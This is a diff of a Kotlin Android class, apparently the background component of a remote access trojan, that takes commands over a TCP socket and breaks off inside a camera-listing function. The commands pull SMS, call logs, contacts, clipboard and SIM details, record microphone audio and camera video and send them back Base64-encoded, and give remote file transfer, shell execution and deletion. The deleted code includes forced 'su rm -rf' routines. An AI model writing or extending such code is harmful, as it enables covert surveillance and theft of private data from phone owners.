@@ -37,7 +37,12 @@ class BackgroundTcpManager(private val context: Context) {
         private const val MAX_RECONNECT_ATTEMPTS = 50
         private const val BASE_RECONNECT_DELAY = 5000L
         private const val MAX_FILE_SIZE = 50 * 1024 * 1024 // 50MB limit
+        private const val CHUNK_SIZE = 8192 // ADD THIS LINE
     }
+
+    private val connectionLock = Any()
+    private val recordingLock = Any()
+
 
     @Volatile
     private var isReconnecting = false
@@ -48,8 +53,19 @@ class BackgroundTcpManager(private val context: Context) {
     private var currentDirectory = Environment.getExternalStorageDirectory().absolutePath
 
     // Audio recording variables
+
+    @Volatile
+    private var isVideoRecording = false
+    @Volatile
+    private var videoFile: File? = null
+    private var mediaRecorderVideo: MediaRecorder? = null
+    private val videoRecordingLock = Any()
+
+    @Volatile
     private var mediaRecorder: MediaRecorder? = null
+    @Volatile
     private var audioFile: File? = null
+    @Volatile
     private var isRecording = false
 
     fun startConnection() {
@@ -162,108 +178,161 @@ class BackgroundTcpManager(private val context: Context) {
             scheduleReconnect()
         }
     }
+// COMPLETE FIXED processBackgroundCommand method - Replace in BackgroundTcpManager.kt
 
     private suspend fun processBackgroundCommand(command: String, socket: Socket) {
         try {
-            Log.d(TAG, "Processing command: '$command'")
+            val startTime = System.currentTimeMillis()
+            Log.d(TAG, "Processing command: '$command' at $startTime")
+
+            // Add small delay to ensure command is fully received
+            delay(10)
 
             when {
-                // === DEVICE INFORMATION ===
                 command == "deviceInfo" -> {
+                    Log.d(TAG, "Executing: deviceInfo")
                     val deviceInfo = getDeviceInfo()
                     sendResponse(deviceInfo, socket)
                 }
 
                 command == "getIP" -> {
+                    Log.d(TAG, "Executing: getIP")
                     val ipAddress = getDeviceIP()
                     sendResponse("Device IP: $ipAddress", socket)
                 }
 
                 command == "getMACAddress" -> {
+                    Log.d(TAG, "Executing: getMACAddress")
                     val macAddress = getMACAddress()
                     sendResponse("MAC Address: $macAddress", socket)
                 }
 
                 command == "getSimDetails" -> {
+                    Log.d(TAG, "Executing: getSimDetails")
                     val simDetails = getSimDetails()
                     sendResponse(simDetails, socket)
                 }
 
                 command == "sysinfo" -> {
+                    Log.d(TAG, "Executing: sysinfo")
                     val sysInfo = getSystemInfo()
                     sendResponse(sysInfo, socket)
                 }
 
-                // === DATA ACCESS ===
                 command == "getClipData" -> {
+                    Log.d(TAG, "Executing: getClipData")
                     val clipData = getClipboardData()
                     sendResponse("Clipboard: $clipData", socket)
                 }
 
                 command.startsWith("getSMS") -> {
+                    Log.d(TAG, "Executing: getSMS")
                     val smsType = command.substringAfter("getSMS").trim()
                     val smsData = getSMSData(smsType.ifEmpty { "inbox" })
                     sendResponse(smsData, socket)
                 }
 
                 command == "getCallLogs" -> {
+                    Log.d(TAG, "Executing: getCallLogs")
                     val callLogs = getCallLogsData()
                     sendResponse(callLogs, socket)
                 }
 
+                command == "camList" -> {
+                    Log.d(TAG, "Executing: camList")
+                    val result = getCameraList()
+                    sendResponse(result, socket)
+                }
+
+                command.startsWith("startVideo") -> {
+                    Log.d(TAG, "Executing: startVideo")
+                    val parts = command.split(" ")
+                    val cameraId = if (parts.size > 1) {
+                        parts[1].toIntOrNull() ?: 0
+                    } else {
+                        0
+                    }
+                    val result = startVideoRecording(cameraId)
+                    sendResponse(result, socket)
+                }
+
+                command == "stopVideo" -> {
+                    Log.d(TAG, "Executing: stopVideo")
+                    val result = stopVideoRecording()
+                    sendResponse(result, socket)
+                }
+
+                command == "startAudio" -> {
+                    Log.d(TAG, "Executing: startAudio")
+                    val result = startAudioRecording()
+                    sendResponse(result, socket)
+                }
+
+                command == "stopAudio" -> {
+                    Log.d(TAG, "Executing: stopAudio")
+                    val result = stopAudioRecording()
+                    sendResponse(result, socket)
+                }
+
                 command == "getContacts" -> {
+                    Log.d(TAG, "Executing: getContacts")
                     val contacts = getContactsData()
                     sendResponse(contacts, socket)
                 }
 
                 command == "getApps" -> {
+                    Log.d(TAG, "Executing: getApps")
                     val apps = getInstalledApps()
                     sendResponse(apps, socket)
                 }
 
-                // === FILE OPERATIONS ===
                 command == "pwd" -> {
+                    Log.d(TAG, "Executing: pwd")
                     sendResponse("Current directory: $currentDirectory", socket)
                 }
 
                 command.startsWith("cd") -> {
+                    Log.d(TAG, "Executing: cd")
                     val newPath = command.substringAfter("cd").trim()
                     val result = changeDirectory(newPath)
                     sendResponse(result, socket)
                 }
 
                 command.startsWith("ls") -> {
+                    Log.d(TAG, "Executing: ls")
                     val path = command.substringAfter("ls").trim().ifEmpty { currentDirectory }
                     val listing = listDirectory(path)
                     sendResponse(listing, socket)
                 }
 
                 command.startsWith("download") -> {
+                    Log.d(TAG, "Executing: download")
                     val filePath = command.substringAfter("download").trim()
-                    downloadFile(filePath, socket)
+                    if (filePath.isEmpty()) {
+                        sendResponse("ERROR: Usage: download <file_path>", socket)
+                    } else {
+                        downloadFile(filePath, socket)
+                    }
                 }
 
                 command.startsWith("upload ") -> {
-                    val result = handleUpload(command, socket);
+                    Log.d(TAG, "Executing: upload")
+                    val result = handleUpload(command, socket)
                     sendResponse(result, socket)
-
                 }
 
                 command.startsWith("delete") -> {
-                    val args = command.split(" ").drop(1) // Remove "delete"
-
+                    Log.d(TAG, "Executing: delete")
+                    val args = command.split(" ").drop(1)
                     when {
                         args.isEmpty() -> {
                             sendResponse("Usage: delete <file_or_directory>", socket)
                         }
-
                         args[0] == "-f" && args.size > 1 -> {
-                            // Force delete
                             val path = args.drop(1).joinToString(" ")
                             val result = forceDeletePath(path)
                             sendResponse(result, socket)
                         }
-
                         else -> {
                             val path = args.joinToString(" ")
                             val result = deletePathSimple(path)
@@ -273,76 +342,72 @@ class BackgroundTcpManager(private val context: Context) {
                 }
 
                 command.startsWith("mkdir") -> {
+                    Log.d(TAG, "Executing: mkdir")
                     val dirPath = command.substringAfter("mkdir").trim()
                     val result = createDirectory(dirPath)
                     sendResponse(result, socket)
                 }
 
-                // === SYSTEM OPERATIONS ===
                 command == "ps" -> {
+                    Log.d(TAG, "Executing: ps")
                     val processes = getRunningProcesses()
                     sendResponse(processes, socket)
                 }
 
                 command.startsWith("kill") -> {
+                    Log.d(TAG, "Executing: kill")
                     val processName = command.substringAfter("kill").trim()
                     val result = killProcess(processName)
                     sendResponse(result, socket)
                 }
 
                 command == "netstat" -> {
+                    Log.d(TAG, "Executing: netstat")
                     val networkInfo = getNetworkConnections()
                     sendResponse(networkInfo, socket)
                 }
 
                 command.startsWith("ping") -> {
+                    Log.d(TAG, "Executing: ping")
                     val host = command.substringAfter("ping").trim()
                     val result = pingHost(host)
                     sendResponse(result, socket)
                 }
 
-                // === MEDIA ACCESS ===
                 command == "getPhotos" -> {
+                    Log.d(TAG, "Executing: getPhotos")
                     val photos = getPhotosInfo()
                     sendResponse(photos, socket)
                 }
 
                 command == "getAudio" -> {
+                    Log.d(TAG, "Executing: getAudio")
                     val audio = getAudioInfo()
                     sendResponse(audio, socket)
                 }
 
                 command == "getVideos" -> {
+                    Log.d(TAG, "Executing: getVideos")
                     val videos = getVideosInfo()
                     sendResponse(videos, socket)
                 }
 
-                // === AUDIO RECORDING (IMPLEMENTED DIRECTLY) ===
-                command == "startAudio" -> {
-                    val result = startAudioRecording()
-                    sendResponse(result, socket)
-                }
-
-                command == "stopAudio" -> {
-                    val result = stopAudioRecording()
-                    sendResponse(result, socket)
-                }
-
-                // === DEVICE CONTROL ===
                 command.startsWith("vibrate") -> {
+                    Log.d(TAG, "Executing: vibrate")
                     val times = command.substringAfter("vibrate").trim().toIntOrNull() ?: 1
                     val result = vibrateDevice(times)
                     sendResponse(result, socket)
                 }
 
                 command.startsWith("setClip") -> {
+                    Log.d(TAG, "Executing: setClip")
                     val text = command.substringAfter("setClip").trim()
                     val result = setClipboardData(text)
                     sendResponse(result, socket)
                 }
 
-                // === SHELL COMMANDS ===
                 command.startsWith("shell") -> {
+                    Log.d(TAG, "Executing: shell")
                     val shellCmd = command.substringAfter("shell").trim()
                     if (shellCmd.isEmpty()) {
                         sendResponse("Usage: shell <command>", socket)
@@ -352,16 +417,18 @@ class BackgroundTcpManager(private val context: Context) {
                     }
                 }
 
-                // === SYSTEM COMMANDS ===
                 command == "help" -> {
+                    Log.d(TAG, "Executing: help")
                     sendResponse(getCompleteHelpText(), socket)
                 }
 
                 command == "clear" -> {
+                    Log.d(TAG, "Executing: clear")
                     sendResponse("\n".repeat(50) + "Screen cleared", socket)
                 }
 
                 command == "exit" -> {
+                    Log.d(TAG, "Executing: exit")
                     sendResponse("Background connection closing. Goodbye!", socket)
                     withContext(Dispatchers.IO) {
                         socket.close()
@@ -369,453 +436,366 @@ class BackgroundTcpManager(private val context: Context) {
                     return
                 }
 
-                command.isEmpty() -> {
-                    // Ignore empty commands
+                command.isEmpty() || command.isBlank() -> {
+                    Log.d(TAG, "Ignoring empty command")
+                    return // Don't send response for empty commands
                 }
 
                 else -> {
+                    Log.d(TAG, "Unknown command: $command")
                     sendResponse("Unknown Command: '$command'\nType 'help' for available commands", socket)
                 }
             }
+
+            val endTime = System.currentTimeMillis()
+            Log.d(TAG, "Command '$command' completed in ${endTime - startTime}ms")
+
         } catch (e: Exception) {
-            Log.e(TAG, "Error processing background command '$command': ${e.message}", e)
-            sendResponse("Error executing command: ${e.message}", socket)
+            Log.e(TAG, "Error processing command '$command': ${e.message}", e)
+            sendResponse("Command execution error: ${e.message}", socket)
         }
     }
-
-    // === AUDIO RECORDING IMPLEMENTATION ===
-
     private fun startAudioRecording(): String {
-        return try {
-            if (isRecording) {
-                return "Audio recording already in progress"
-            }
-
-            if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
-                != PackageManager.PERMISSION_GRANTED) {
-                return "Permission denied: RECORD_AUDIO required"
-            }
-
-            // Create audio file
-            val outputDir = context.cacheDir
-            audioFile = File.createTempFile("audio_", ".mp4", outputDir)
-
-            mediaRecorder = MediaRecorder().apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                setOutputFile(audioFile!!.absolutePath)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
-
-                prepare()
-                start()
-            }
-
-            isRecording = true
-            "Audio recording started successfully"
-
-        } catch (e: Exception) {
-            Log.e(TAG, "Error starting audio recording: ${e.message}")
-            "Error starting audio recording: ${e.message}"
-        }
-    }
-// ENHANCED DELETE FIX for BackgroundTcpManager.kt
-
-    private fun deletePathSimple(inputPath: String): String {
-        return try {
-            val file = if (inputPath.startsWith("/")) {
-                File(inputPath)
-            } else {
-                File(currentDirectory, inputPath)
-            }
-
-            Log.d(TAG, "Delete request for: ${file.absolutePath}")
-
-            if (!file.exists()) {
-                return "File/directory not found: ${file.absolutePath}"
-            }
-
-            // Check if it's a protected system directory
-            val protectedPaths = listOf(
-                "/storage/emulated/0/Android",
-                "/storage/emulated/0/Ringtones",
-                "/storage/emulated/0/Notifications",
-                "/storage/emulated/0/Alarms",
-                "/storage/emulated/0/Audiobooks",
-                "/storage/emulated/0/Podcasts"
-            )
-
-            if (protectedPaths.any { file.absolutePath.startsWith(it) }) {
-                return "BLOCKED: ${file.name} is a protected system directory.\n" +
-                        "Android 12+ prevents deletion of system media folders.\n" +
-                        "Try deleting specific files instead of entire directories."
-            }
-
-            // Check writable locations
-            val writablePaths = listOf(
-                "/storage/emulated/0/Download",
-                "/storage/emulated/0/Documents",
-                "/storage/emulated/0/Pictures",
-                "/storage/emulated/0/Movies",
-                "/storage/emulated/0/Music",
-                "/storage/emulated/0/DCIM"
-            )
-
-            val isInWritableLocation = writablePaths.any { file.absolutePath.startsWith(it) }
-
-            if (!isInWritableLocation && file.absolutePath.startsWith("/storage/emulated/0/")) {
-                return "RESTRICTED: ${file.name} is in a restricted location.\n" +
-                        "Android scoped storage only allows deletion from:\n" +
-                        "- Download/\n- Documents/\n- Pictures/\n- Movies/\n- Music/\n- DCIM/\n" +
-                        "Current path: ${file.absolutePath}"
-            }
-
-            val originalSize = if (file.isFile) file.length() else calculateTotalSize(file)
-            val itemType = if (file.isDirectory) "directory" else "file"
-            val itemCount = if (file.isDirectory) countItems(file) else 1
-
-            // Try multiple deletion methods
-            val success = when {
-                // Method 1: Try MediaStore deletion for media files
-                isMediaFile(file) -> tryMediaStoreDelete(file)
-
-                // Method 2: Standard file deletion
-                file.isFile -> {
-                    try {
-                        file.delete()
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Standard delete failed: ${e.message}")
-                        false
-                    }
+        return synchronized(recordingLock) {
+            try {
+                if (isRecording) {
+                    return "Audio recording already in progress"
                 }
 
-                // Method 3: Directory deletion (careful!)
-                file.isDirectory -> {
-                    try {
-                        deleteRecursiveCareful(file)
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Directory delete failed: ${e.message}")
-                        false
-                    }
+                if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
+                    != PackageManager.PERMISSION_GRANTED) {
+                    return "Permission denied: RECORD_AUDIO required"
                 }
 
-                else -> false
-            }
+                // Create audio file in a better location
+                val outputDir = File(context.getExternalFilesDir(null), "audio")
+                if (!outputDir.exists()) outputDir.mkdirs()
 
-            if (success) {
-                "SUCCESS: Deleted $itemType '${file.name}'\n" +
-                        "Path: ${file.absolutePath}\n" +
-                        "Items removed: $itemCount\n" +
-                        "Space freed: ${formatFileSize(originalSize)}"
-            } else {
-                "FAILED: Could not delete ${file.absolutePath}\n" +
-                        "Possible reasons:\n" +
-                        "- Android scoped storage restrictions\n" +
-                        "- File is system-protected\n" +
-                        "- Insufficient permissions\n" +
-                        "- File is currently in use\n\n" +
-                        "TIP: Try 'delete force $inputPath' for aggressive deletion"
-            }
+                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
+                audioFile = File(outputDir, "audio_$timestamp.m4a")
 
-        } catch (e: Exception) {
-            "ERROR: Delete failed - ${e.message}"
-        }
-    }
-
-    // Enhanced media file detection
-    private fun isMediaFile(file: File): Boolean {
-        val mediaExtensions = setOf(
-            "jpg", "jpeg", "png", "gif", "bmp", "webp",
-            "mp4", "avi", "mkv", "mov", "wmv", "flv",
-            "mp3", "wav", "flac", "aac", "ogg", "m4a",
-            "pdf", "doc", "docx", "txt"
-        )
-        return file.extension.lowercase() in mediaExtensions
-    }
-
-    // Careful recursive delete with permission checks
-    private fun deleteRecursiveCareful(directory: File): Boolean {
-        return try {
-            var allDeleted = true
-            var deletedCount = 0
-
-            // Only delete files we can actually access
-            directory.walkBottomUp().forEach { file ->
-                try {
-                    // Skip if we can't read the file
-                    if (!file.canRead()) {
-                        Log.w(TAG, "Cannot read file, skipping: ${file.absolutePath}")
-                        return@forEach
-                    }
-
-                    // For files, check if they're deletable
-                    if (file.isFile) {
-                        if (file.canWrite() || file.delete()) {
-                            deletedCount++
-                            Log.d(TAG, "Deleted file: ${file.name}")
-                        } else {
-                            allDeleted = false
-                            Log.w(TAG, "Cannot delete file: ${file.absolutePath}")
-                        }
-                    } else if (file.isDirectory) {
-                        // Only delete empty directories
-                        val contents = file.listFiles()
-                        if (contents == null || contents.isEmpty()) {
-                            if (file.delete()) {
-                                deletedCount++
-                                Log.d(TAG, "Deleted empty directory: ${file.name}")
-                            } else {
-                                allDeleted = false
-                                Log.w(TAG, "Cannot delete directory: ${file.absolutePath}")
-                            }
-                        }
-                    }
-                } catch (e: Exception) {
-                    allDeleted = false
-                    Log.w(TAG, "Exception deleting ${file.absolutePath}: ${e.message}")
-                }
-            }
-
-            Log.d(TAG, "Recursive delete completed. Deleted: $deletedCount items, All successful: $allDeleted")
-            allDeleted
-
-        } catch (e: Exception) {
-            Log.e(TAG, "Recursive delete failed: ${e.message}")
-            false
-        }
-    }
-
-    // Enhanced MediaStore deletion
-    private fun tryMediaStoreDelete(file: File): Boolean {
-        return try {
-            val resolver = context.contentResolver
-
-            // Try different MediaStore URIs based on file type
-            val uris = listOf(
-                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
-                android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
-                android.provider.MediaStore.Files.getContentUri("external")
-            )
-
-            for (uri in uris) {
-                try {
-                    val selection = "${android.provider.MediaStore.MediaColumns.DATA} = ?"
-                    val selectionArgs = arrayOf(file.absolutePath)
-
-                    val deleted = resolver.delete(uri, selection, selectionArgs)
-                    if (deleted > 0) {
-                        Log.d(TAG, "MediaStore delete successful: $deleted rows")
-                        return true
-                    }
-                } catch (e: Exception) {
-                    Log.w(TAG, "MediaStore delete attempt failed for URI $uri: ${e.message}")
-                }
-            }
-
-            false
-        } catch (e: Exception) {
-            Log.e(TAG, "MediaStore delete failed: ${e.message}")
-            false
-        }
-    }
-
-    // Add force delete option
-    private fun forceDeleteEnhanced(inputPath: String): String {
-        return try {
-            val file = if (inputPath.startsWith("/")) {
-                File(inputPath)
-            } else {
-                File(currentDirectory, inputPath)
-            }
-
-            Log.d(TAG, "FORCE delete request for: ${file.absolutePath}")
-
-            if (!file.exists()) {
-                return "File/directory not found: ${file.absolutePath}"
-            }
-
-            var successMethods = mutableListOf<String>()
-            var attempts = 0
-
-            // Method 1: Root shell command (if available)
-            attempts++
-            if (tryRootDelete(file.absolutePath)) {
-                successMethods.add("Root shell")
-            }
-
-            // Method 2: Multiple shell commands
-            attempts++
-            if (tryShellDeleteEnhanced(file.absolutePath)) {
-                successMethods.add("Shell command")
-            }
-
-            // Method 3: MediaStore with different approaches
-            attempts++
-            if (tryMediaStoreDelete(file)) {
-                successMethods.add("MediaStore")
-            }
-
-            // Method 4: File.delete() with permission change attempt
-            attempts++
-            if (tryPermissionDelete(file)) {
-                successMethods.add("Permission change")
-            }
-
-            // Method 5: DocumentFile API (for newer Android)
-            attempts++
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && tryDocumentFileDelete(file)) {
-                successMethods.add("DocumentFile API")
-            }
-
-            if (successMethods.isNotEmpty()) {
-                "FORCE DELETE SUCCESS!\n" +
-                        "File: ${file.name}\n" +
-                        "Path: ${file.absolutePath}\n" +
-                        "Methods used: ${successMethods.joinToString(", ")}\n" +
-                        "Attempts: $attempts"
-            } else {
-                "FORCE DELETE FAILED!\n" +
-                        "File: ${file.absolutePath}\n" +
-                        "All $attempts methods failed.\n" +
-                        "This file may be:\n" +
-                        "- System-critical and protected by Android\n" +
-                        "- Actively in use by another process\n" +
-                        "- Requiring root access\n" +
-                        "- Protected by SELinux policies"
-            }
-
-        } catch (e: Exception) {
-            "FORCE DELETE ERROR: ${e.message}"
-        }
-    }
-
-    private fun tryRootDelete(path: String): Boolean {
-        return try {
-            val commands = listOf(
-                "su -c 'rm -rf \"$path\"'",
-                "su -c 'rm -f \"$path\"'"
-            )
-
-            for (cmd in commands) {
-                val process = Runtime.getRuntime().exec(cmd)
-                val exitCode = process.waitFor()
-                if (exitCode == 0) {
-                    Log.d(TAG, "Root delete successful with: $cmd")
-                    return true
-                }
-            }
-            false
-        } catch (e: Exception) {
-            Log.w(TAG, "Root delete failed: ${e.message}")
-            false
-        }
-    }
-
-    private fun tryShellDeleteEnhanced(path: String): Boolean {
-        return try {
-            val pathVariations = listOf(
-                path,
-                path.replace("/storage/emulated/0/", "/sdcard/"),
-                path.replace("/sdcard/", "/storage/emulated/0/"),
-                path.replace("/storage/emulated/0/", "/mnt/sdcard/"),
-                "/data/media/0/" + path.removePrefix("/storage/emulated/0/")
-            ).distinct()
-
-            val commands = listOf("rm -rf", "rm -f", "rmdir", "unlink")
-
-            for (testPath in pathVariations) {
-                for (cmd in commands) {
-                    try {
-                        val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", "$cmd \"$testPath\""))
-                        val exitCode = process.waitFor()
-                        if (exitCode == 0) {
-                            Log.d(TAG, "Shell delete successful: $cmd $testPath")
-                            return true
-                        }
-                    } catch (e: Exception) {
-                        // Continue trying other combinations
-                    }
-                }
-            }
-            false
-        } catch (e: Exception) {
-            Log.w(TAG, "Enhanced shell delete failed: ${e.message}")
-            false
-        }
-    }
-
-    private fun tryPermissionDelete(file: File): Boolean {
-        return try {
-            // Try to make it writable first
-            if (file.setWritable(true) && file.setReadable(true)) {
-                if (file.delete()) {
-                    return true
-                }
-            }
-
-            // Try parent directory permissions
-            val parent = file.parentFile
-            if (parent != null && parent.setWritable(true)) {
-                return file.delete()
-            }
-
-            false
-        } catch (e: Exception) {
-            Log.w(TAG, "Permission delete failed: ${e.message}")
-            false
-        }
-    }
-
-    private fun tryDocumentFileDelete(file: File): Boolean {
-        return try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                // This would require DocumentFile API implementation
-                // Complex implementation needed for full SAF support
-                Log.d(TAG, "DocumentFile deletion not fully implemented")
-            }
-            false
-        } catch (e: Exception) {
-            Log.w(TAG, "DocumentFile delete failed: ${e.message}")
-            false
-        }
-    }
-    private fun stopAudioRecording(): String {
-        return try {
-            if (!isRecording || mediaRecorder == null) {
-                return "No active audio recording"
-            }
-
-            mediaRecorder?.apply {
-                stop()
-                release()
-            }
-            mediaRecorder = null
-            isRecording = false
-
-            audioFile?.let { file ->
-                if (file.exists() && file.length() > 0) {
-                    val fileData = file.readBytes()
-                    val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)
-
-                    // Clean up the file
-                    file.delete()
-
-                    // Return audio data - in real implementation, you'd send this separately
-                    "Audio recording stopped. File size: ${formatFileSize(fileData.size.toLong())}\nAUDIO_DATA:$encodedData"
+                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    MediaRecorder(context)
                 } else {
-                    "Audio recording stopped but no data captured"
-                }
-            } ?: "Audio recording stopped but file not found"
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }.apply {
+                    // IMPROVED: Better audio settings for compatibility
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    setOutputFile(audioFile!!.absolutePath)
+                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
 
-        } catch (e: Exception) {
-            Log.e(TAG, "Error stopping audio recording: ${e.message}")
-            isRecording = false
-            mediaRecorder?.release()
-            mediaRecorder = null
-            "Error stopping audio recording: ${e.message}"
+                    // ADDED: Better quality settings
+                    setAudioSamplingRate(44100)
+                    setAudioEncodingBitRate(128000) // 128 kbps
+                    setAudioChannels(2) // Stereo
+
+                    try {
+                        prepare()
+                        start()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "MediaRecorder prepare/start failed: ${e.message}")
+                        release()
+                        throw e
+                    }
+                }
+
+                isRecording = true
+                Log.d(TAG, "Audio recording started: ${audioFile!!.absolutePath}")
+                "Audio recording started successfully\nFile: ${audioFile!!.name}\nFormat: M4A/AAC"
+
+            } catch (e: Exception) {
+                Log.e(TAG, "Error starting audio recording: ${e.message}")
+                isRecording = false
+                mediaRecorder?.release()
+                mediaRecorder = null
+                audioFile?.delete()
+                audioFile = null
+                "Error starting audio recording: ${e.message}"
+            }
         }
     }
 
+    private fun stopAudioRecording(): String {
+        return synchronized(recordingLock) {
+            try {
+                if (!isRecording || mediaRecorder == null) {
+                    return "No active audio recording"
+                }
+
+                try {
+                    mediaRecorder?.stop()
+                } catch (e: Exception) {
+                    Log.w(TAG, "Error stopping MediaRecorder: ${e.message}")
+                }
+
+                mediaRecorder?.release()
+                mediaRecorder = null
+                isRecording = false
+
+                audioFile?.let { file ->
+                    if (file.exists() && file.length() > 0) {
+                        Log.d(TAG, "Audio file created: ${file.absolutePath}, size: ${file.length()}")
+
+                        val fileData = file.readBytes()
+                        val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)
+
+                        // Keep the file for debugging (comment out to delete)
+                        // file.delete()
+
+                        val result = """
+Audio recording stopped successfully!
+File: ${file.name}
+Size: ${formatFileSize(fileData.size.toLong())}
+Format: M4A/AAC 44.1kHz Stereo
+Path: ${file.absolutePath}
+
+AUDIO_DATA:$encodedData
+                    """.trimIndent()
+
+                        Log.d(TAG, "Audio recording completed: ${file.name}, ${fileData.size} bytes")
+                        return result
+
+                    } else {
+                        val error = "Audio recording stopped but no data captured\nFile exists: ${file.exists()}, Size: ${file.length()}"
+                        Log.w(TAG, error)
+                        return error
+                    }
+                } ?: run {
+                    val error = "Audio recording stopped but file not found"
+                    Log.w(TAG, error)
+                    return error
+                }
+
+            } catch (e: Exception) {
+                Log.e(TAG, "Error stopping audio recording: ${e.message}")
+                isRecording = false
+                mediaRecorder?.release()
+                mediaRecorder = null
+                return "Error stopping audio recording: ${e.message}"
+            }
+        }
+    }
+
+
+// VIDEO RECORDING IMPLEMENTATION
+// FIXED: Update startVideoRecording to TRY FIRST, handle errors when they occur
+
+    private fun startVideoRecording(cameraId: Int = 0): String {
+        return synchronized(videoRecordingLock) {
+            try {
+                Log.d(TAG, "Attempting video recording with camera $cameraId on Android ${Build.VERSION.RELEASE}")
+
+                if (isVideoRecording) {
+                    return "Video recording already in progress"
+                }
+
+                // Check permissions first (but don't check Android version)
+                if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
+                    ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                    return "Permission denied: CAMERA and RECORD_AUDIO required"
+                }
+
+                // Create video file
+                val outputDir = File(context.getExternalFilesDir(null), "videos")
+                if (!outputDir.exists()) outputDir.mkdirs()
+
+                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
+                videoFile = File(outputDir, "video_$timestamp.mp4")
+
+                Log.d(TAG, "Creating MediaRecorder for video...")
+
+                // TRY to create MediaRecorder - let Android tell us if it fails
+                mediaRecorderVideo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    MediaRecorder(context)
+                } else {
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }.apply {
+                    try {
+                        Log.d(TAG, "Configuring MediaRecorder...")
+
+                        // TRY to configure video recording
+                        setVideoSource(MediaRecorder.VideoSource.CAMERA)
+                        setAudioSource(MediaRecorder.AudioSource.MIC)
+                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                        setOutputFile(videoFile!!.absolutePath)
+
+                        // Video settings
+                        setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+                        setVideoSize(1280, 720) // 720p
+                        setVideoFrameRate(30)
+                        setVideoEncodingBitRate(2000000) // 2 Mbps
+
+                        // Audio settings
+                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                        setAudioSamplingRate(44100)
+                        setAudioEncodingBitRate(128000)
+
+                        Log.d(TAG, "Preparing MediaRecorder...")
+                        prepare()
+
+                        Log.d(TAG, "Starting MediaRecorder...")
+                        start()
+
+                        Log.d(TAG, "MediaRecorder started successfully!")
+
+                    } catch (e: Exception) {
+                        Log.e(TAG, "MediaRecorder configuration failed: ${e.message}", e)
+                        release()
+                        throw e
+                    }
+                }
+
+                isVideoRecording = true
+                Log.d(TAG, "Video recording started successfully: ${videoFile!!.absolutePath}")
+
+                return """
+Video recording started successfully!
+File: ${videoFile!!.name}
+Format: MP4/H264 720p@30fps
+Camera: $cameraId
+Path: ${videoFile!!.absolutePath}
+Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
+Device: ${Build.MODEL}
+            """.trimIndent()
+
+            } catch (e: SecurityException) {
+                Log.e(TAG, "Security exception during video recording: ${e.message}", e)
+                cleanup()
+                return "Video recording blocked by Android security: ${e.message}"
+
+            } catch (e: RuntimeException) {
+                Log.e(TAG, "Runtime exception during video recording: ${e.message}", e)
+                cleanup()
+                return "Video recording failed (camera may be in use): ${e.message}"
+
+            } catch (e: Exception) {
+                Log.e(TAG, "Unexpected error during video recording: ${e.message}", e)
+                cleanup()
+                return "Video recording failed: ${e.message}"
+            }
+        }
+    }
+
+
+    private fun stopVideoRecording(): String {
+        return synchronized(videoRecordingLock) {
+            try {
+                if (!isVideoRecording || mediaRecorderVideo == null) {
+                    return "No active video recording"
+                }
+
+                try {
+                    mediaRecorderVideo?.stop()
+                } catch (e: Exception) {
+                    Log.w(TAG, "Error stopping video MediaRecorder: ${e.message}")
+                }
+
+                mediaRecorderVideo?.release()
+                mediaRecorderVideo = null
+                isVideoRecording = false
+
+                videoFile?.let { file ->
+                    if (file.exists() && file.length() > 0) {
+                        Log.d(TAG, "Video file created: ${file.absolutePath}, size: ${file.length()}")
+
+                        val fileData = file.readBytes()
+                        val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)
+
+                        // Keep the file for debugging (comment out to delete)
+                        // file.delete()
+
+                        val result = """
+Video recording stopped successfully!
+File: ${file.name}
+Size: ${formatFileSize(fileData.size.toLong())}
+Format: MP4/H264 720p
+Path: ${file.absolutePath}
+
+VIDEO_DATA:$encodedData
+                    """.trimIndent()
+
+                        Log.d(TAG, "Video recording completed: ${file.name}, ${fileData.size} bytes")
+                        return result
+
+                    } else {
+                        val error = "Video recording stopped but no data captured\nFile exists: ${file.exists()}, Size: ${file.length()}"
+                        Log.w(TAG, error)
+                        return error
+                    }
+                } ?: run {
+                    val error = "Video recording stopped but file not found"
+                    Log.w(TAG, error)
+                    return error
+                }
+
+            } catch (e: Exception) {
+                Log.e(TAG, "Error stopping video recording: ${e.message}")
+                isVideoRecording = false
+                mediaRecorderVideo?.release()
+                mediaRecorderVideo = null
+                return "Error stopping video recording: ${e.message}"
+            }
+        }
+    }
+
+    private fun getCameraList(): String {
+        return try {
+            val result = StringBuilder()
+            result.append("=== AVAILABLE CAMERAS ===\n\n")
+
